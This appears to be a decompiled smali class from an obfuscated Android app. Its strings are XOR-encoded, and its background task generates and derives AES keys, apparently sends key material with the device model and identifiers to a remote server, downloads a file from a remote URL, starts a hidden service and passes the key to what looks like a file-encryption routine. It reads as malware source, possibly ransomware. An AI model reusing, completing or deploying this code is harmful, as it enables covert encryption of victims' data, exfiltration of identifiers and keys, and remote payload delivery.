.class Lzvy/zpfypq/bbuhtkwvaf/y;
.super Landroid/os/AsyncTask;


# static fields
.field private static final a:[Ljava/lang/String;

.field static b:Ljavax/crypto/SecretKey;


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0x1a

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "7\u000e\u0011|F\u0013N\u0013w\u001dv\u000e_j\u001d`\u000e\u0011|F\u0013D\u001fa\u001dv\u000e_j\u001d`\u000e\u000c|Q(C\u0008;\u0005n\t\t;\u0013nG\u001f``?X\u001bmZn\u0016X<LnQ"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/16 v9, 0x3f

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "/^\u0003iK\u0013G\u001f`"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "\ri)"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "/^\u0003iK\u0013G\u001f`"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "\u0013s\trS-_\t|`%B\u0013m"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "%A\u001fp"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "<^\u0015zZ?_\u001f}"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "-O\u000epP\""

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    const/16 v2, 0x8

    const-string v1, "/^\u0003iK\u0013G\u001f`"

    const/4 v0, 0x7

    move-object v3, v4

    goto :goto_0

    :pswitch_7
    aput-object v1, v3, v2

    const/16 v2, 0x9

    const-string v1, "sM\u0019mV#BGhM\u0013O\u0015}ZjM\u001e}Mq"

    const/16 v0, 0x8

    move-object v3, v4

    goto :goto_0

    :pswitch_8
    aput-object v1, v3, v2

    const/16 v2, 0xa

    const-string v1, ";M\u0016uZ8"

    const/16 v0, 0x9

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_9
    aput-object v1, v3, v2

    const/16 v2, 0xb

    const-string v1, "/^\u0003iK\u0013G\u001f`"

    const/16 v0, 0xa

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_a
    aput-object v1, v3, v2

    const/16 v2, 0xc

    const-string v1, "x\u001cK"

    const/16 v0, 0xb

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_b
    aput-object v1, v3, v2

    const/16 v2, 0xd

    const-string v1, "c]\u0008F\\#H\u001f7O\"K"

    const/16 v0, 0xc

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_c
    aput-object v1, v3, v2

    const/16 v2, 0xe

    const-string v1, "<M\u0013}`\'I\u0003"

    const/16 v0, 0xd

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_d
    aput-object v1, v3, v2

    const/16 v2, 0xf

    const-string v1, "\u0013s\trS-_\t|`%B\u0013m"

    const/16 v0, 0xe

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_e
    aput-object v1, v3, v2

    const/16 v2, 0x10

    const-string v1, "\"I\r9T)UZ~Z\"I\u0008xK)H"

    const/16 v0, 0xf

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_f
    aput-object v1, v3, v2

    const/16 v2, 0x11

    const-string v1, "jM\u0017vJ\"XG"

    const/16 v0, 0x10

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_10
    aput-object v1, v3, v2

    const/16 v2, 0x12

    const-string v1, ";M\u0016uZ8"

    const/16 v0, 0x11

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_11
    aput-object v1, v3, v2

    const/16 v2, 0x13

    const-string v1, "+I\u000eF^(H\u0008"

    const/16 v0, 0x12

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_12
    aput-object v1, v3, v2

    const/16 v2, 0x14

    const-string v1, "i\u0002N\u007f"

    const/16 v0, 0x13

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_13
    aput-object v1, v3, v2

    const/16 v2, 0x15

    const-string v1, "c]\u0008F\\#H\u001f7O\"K"

    const/16 v0, 0x14

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_14
    aput-object v1, v3, v2

    const/16 v2, 0x16

    const-string v1, "jE\u0017|Vq"

    const/16 v0, 0x15

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_15
    aput-object v1, v3, v2

    const/16 v2, 0x17

    const-string v1, "9_\u001f}\u001f+I\u0014|M-X\u001f}\u001f\'I\u0003"

    const/16 v0, 0x16

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_16
    aput-object v1, v3, v2

    const/16 v2, 0x18

    const-string v1, "\ri)"

    const/16 v0, 0x17

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_17
    aput-object v1, v3, v2

    const/16 v2, 0x19

    const-string v1, "\u001cn1]y~{\u0013mW\u0004A\u001bzl\u0004mK"

    const/16 v0, 0x18

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_18
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v0, 0x0

    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    return-void

    :pswitch_19
    const/16 v9, 0x4c

    goto/16 :goto_2

    :pswitch_1a
    const/16 v9, 0x2c

    goto/16 :goto_2

    :pswitch_1b
    const/16 v9, 0x7a

    goto/16 :goto_2

    :pswitch_1c
    const/16 v9, 0x19

    goto/16 :goto_2

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_19
        :pswitch_1a
        :pswitch_1b
        :pswitch_1c
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
        :pswitch_b
        :pswitch_c
        :pswitch_d
        :pswitch_e
        :pswitch_f
        :pswitch_10
        :pswitch_11
        :pswitch_12
        :pswitch_13
        :pswitch_14
        :pswitch_15
        :pswitch_16
        :pswitch_17
        :pswitch_18
    .end packed-switch
.end method

.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method public static a(Landroid/content/Context;)Ljava/lang/String;
    .locals 3

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->dataDir:Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static a()Ljavax/crypto/SecretKey;
    .locals 3

    :try_start_0
    new-instance v0, Ljava/security/SecureRandom;

    invoke-direct {v0}, Ljava/security/SecureRandom;-><init>()V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v2, 0x2

    aget-object v1, v1, v2

    invoke-static {v1}, Ljavax/crypto/KeyGenerator;->getInstance(Ljava/lang/String;)Ljavax/crypto/KeyGenerator;

    move-result-object v1

    const/16 v2, 0x100

    invoke-virtual {v1, v2, v0}, Ljavax/crypto/KeyGenerator;->init(ILjava/security/SecureRandom;)V

    invoke-virtual {v1}, Ljavax/crypto/KeyGenerator;->generateKey()Ljavax/crypto/SecretKey;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static a([C[B)Ljavax/crypto/SecretKey;
    .locals 4

    :try_start_0
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v1, 0x19

    aget-object v0, v0, v1

    invoke-static {v0}, Ljavax/crypto/SecretKeyFactory;->getInstance(Ljava/lang/String;)Ljavax/crypto/SecretKeyFactory;

    move-result-object v0

    new-instance v1, Ljavax/crypto/spec/PBEKeySpec;

    const/16 v2, 0x3e8

    const/16 v3, 0x100

    invoke-direct {v1, p0, p1, v2, v3}, Ljavax/crypto/spec/PBEKeySpec;-><init>([C[BII)V

    invoke-virtual {v0, v1}, Ljavax/crypto/SecretKeyFactory;->generateSecret(Ljava/security/spec/KeySpec;)Ljavax/crypto/SecretKey;

    move-result-object v0

    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    goto :goto_0
.end method


# virtual methods
.method public a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7

    const/4 v6, 0x1

    const/4 v5, 0x0

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    sget-object v1, Ljava/util/Locale;->US:Ljava/util/Locale;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    aget-object v2, v2, v5

    const/4 v3, 0x4

    new-array v3, v3, [Ljava/lang/Object;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    invoke-interface {v4}, Ljavax/crypto/SecretKey;->getEncoded()[B

    move-result-object v4

    invoke-static {v4}, Ljava/util/Arrays;->toString([B)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v5

    aput-object p2, v3, v6

    const/4 v4, 0x2

    aput-object v0, v3, v4

    const/4 v0, 0x3

    aput-object p3, v3, v0

    invoke-static {v1, v2, v3}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/m;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    aget-object v2, v2, v6

    invoke-direct {v1, p1, v2}, Lzvy/zpfypq/bbuhtkwvaf/m;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    new-array v2, v6, [Ljava/lang/Object;

    aput-object v0, v2, v5

    invoke-virtual {v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/m;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void
.end method

.method protected b([Landroid/content/Context;)Ljava/lang/Void;
    .locals 9

    const/4 v7, 0x1

    const/4 v8, 0x0

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/z;

    invoke-direct {v0}, Lzvy/zpfypq/bbuhtkwvaf/z;-><init>()V

    aget-object v1, p1, v8

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/y;

    invoke-virtual {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/z;->a(Landroid/content/Context;Ljava/lang/Class;)V

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/r;

    aget-object v0, p1, v8

    invoke-direct {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/r;-><init>(Landroid/content/Context;)V

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v2, 0x8

    aget-object v0, v0, v2

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v3, 0x6

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Z

    move-result v2

    :try_start_0
    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v4, 0x4

    aget-object v3, v3, v4

    invoke-virtual {v1, v3}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v4, 0xf

    aget-object v3, v3, v4

    const/4 v4, 0x1

    invoke-virtual {v1, v3, v4}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :cond_0
    if-nez v2, :cond_7

    :try_start_1
    const-string v2, ""
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-ne v0, v2, :cond_4

    const/16 v0, 0x80

    invoke-static {v0, v8}, Lzvy/zpfypq/bbuhtkwvaf/a;->a(IZ)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    :try_start_2
    invoke-static {}, Lzvy/zpfypq/bbuhtkwvaf/y;->a()Ljavax/crypto/SecretKey;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-static {v0, v2}, Lzvy/zpfypq/bbuhtkwvaf/y;->a([C[B)Ljavax/crypto/SecretKey;

    move-result-object v0

    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    invoke-interface {v0}, Ljavax/crypto/SecretKey;->getEncoded()[B

    move-result-object v0

    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/a;->a([B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v3, 0xb

    aget-object v2, v2, v3

    invoke-virtual {v1, v2, v0}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x0

    aget-object v2, p1, v2

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v4, 0x10

    aget-object v3, v3, v4

    invoke-virtual {p0, v2, v0, v3}, Lzvy/zpfypq/bbuhtkwvaf/y;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    :goto_0
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v2, 0x12

    aget-object v0, v0, v2

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    new-instance v2, Ljava/util/ArrayList;

    const/4 v3, 0x2

    invoke-direct {v2, v3}, Ljava/util/ArrayList;-><init>(I)V

    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v5, 0x7

    aget-object v4, v4, v5

    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v6, 0x13

    aget-object v5, v5, v6

    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v5, 0x5

    aget-object v4, v4, v5

    aget-object v5, p1, v8

    invoke-static {v5}, Lzvy/zpfypq/bbuhtkwvaf/d;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    aget-object v3, p1, v8

    invoke-static {v3, v2, v8}, Lzvy/zpfypq/bbuhtkwvaf/llllLIlLlIIllIllIlIIlLIllIlllIlLlIlIIllllIllllIIlIIIIlll;->a(Landroid/content/Context;Ljava/util/List;Z)Ljava/lang/CharSequence;

    move-result-object v2

    const-string v3, ""

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_5

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v3, 0xa

    aget-object v0, v0, v3

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v0, v3}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_1
    :goto_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/s;->d:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v3, 0x9

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v2, 0x11

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v2, 0x14

    aget-object v1, v1, v2

    new-array v2, v7, [Ljava/lang/Object;

    new-instance v3, Ljava/math/BigDecimal;

    sget-wide v4, Lzvy/zpfypq/bbuhtkwvaf/s;->j:D

    invoke-direct {v3, v4, v5}, Ljava/math/BigDecimal;-><init>(D)V

    aput-object v3, v2, v8

    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v2, 0x16

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    aget-object v1, p1, v8

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/d;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v3, p1, v8

    invoke-static {v3}, Lzvy/zpfypq/bbuhtkwvaf/y;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v4, 0xd

    aget-object v3, v3, v4

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_2

    :try_start_3
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    invoke-virtual {v0}, Ljava/net/URLConnection;->connect()V

    new-instance v2, Ljava/io/BufferedInputStream;

    invoke-virtual {v1}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v0

    const/16 v1, 0x2000

    invoke-direct {v2, v0, v1}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;I)V

    new-instance v3, Ljava/io/FileOutputStream;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/y;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v4, 0x15

    aget-object v1, v1, v4

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    const/16 v0, 0x400

    new-array v4, v0, [B

    const-wide/16 v0, 0x0

    :goto_2
    invoke-virtual {v2, v4}, Ljava/io/InputStream;->read([B)I

    move-result v5

    const/4 v6, -0x1

    if-eq v5, v6, :cond_6

    int-to-long v6, v5

    add-long/2addr v0, v6

    const/4 v6, 0x0

    invoke-virtual {v3, v4, v6, v5}, Ljava/io/OutputStream;->write([BII)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    :cond_2
    :goto_3
    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/a;

    invoke-direct {v0}, Lzvy/zpfypq/bbuhtkwvaf/a;-><init>()V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    invoke-interface {v1}, Ljavax/crypto/SecretKey;->getEncoded()[B

    move-result-object v1

    aget-object v2, p1, v8

    invoke-virtual {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/a;->a([BLandroid/content/Context;)Ljava/io/File;

    :cond_3
    :goto_4
    const/4 v0, 0x0

    return-object v0

    :catch_1
    move-exception v0

    throw v0

    :catch_2
    move-exception v0

    throw v0

    :cond_4
    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/a;->a(Ljava/lang/String;)[B

    move-result-object v2

    new-instance v3, Ljavax/crypto/spec/SecretKeySpec;

    array-length v4, v2

    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v6, 0x18

    aget-object v5, v5, v6

    invoke-direct {v3, v2, v8, v4, v5}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BIILjava/lang/String;)V

    sput-object v3, Lzvy/zpfypq/bbuhtkwvaf/y;->b:Ljavax/crypto/SecretKey;

    aget-object v2, p1, v8

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v4, 0x17

    aget-object v3, v3, v4

    invoke-virtual {p0, v2, v0, v3}, Lzvy/zpfypq/bbuhtkwvaf/y;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_5
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v3, 0xc

    aget-object v1, v1, v3

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/ac;

    aget-object v2, p1, v8

    invoke-direct {v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/ac;-><init>(Landroid/content/Context;)V

    new-array v2, v8, [Ljava/lang/String;

    invoke-virtual {v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/ac;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto/16 :goto_1

    :cond_6
    :try_start_4
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_3

    :cond_7
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/16 v2, 0xe

    aget-object v0, v0, v2

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_3

    aget-object v0, p1, v8

    new-instance v2, Landroid/content/Intent;

    aget-object v3, p1, v8

    const-class v4, Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;

    invoke-direct {v2, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/y;->a:[Ljava/lang/String;

    const/4 v2, 0x3

    aget-object v0, v0, v2

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)V

    goto :goto_4

    :catch_3
    move-exception v0

    goto/16 :goto_0
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, Lzvy/zpfypq/bbuhtkwvaf/y;->b([Landroid/content/Context;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method
